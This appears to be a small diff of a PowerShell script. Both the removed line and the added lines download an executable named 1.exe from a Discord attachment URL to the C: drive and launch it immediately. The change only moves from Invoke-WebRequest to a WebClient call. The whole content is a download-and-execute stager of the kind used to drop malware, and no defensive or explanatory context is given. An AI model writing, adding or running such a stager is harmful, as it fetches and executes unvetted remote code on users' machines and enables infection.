@@ -1,1 +1,3 @@
-Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1223792396718837800/1281355014580994105/1.exe" -OutFile "C:\1.exe"; Start-Process -FilePath "C:\1.exe";
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://cdn.discordapp.com/attachments/1223792396718837800/1281355014580994105/1.exe", "C:\1.exe")
+Start-Process -FilePath "C:\1.exe"
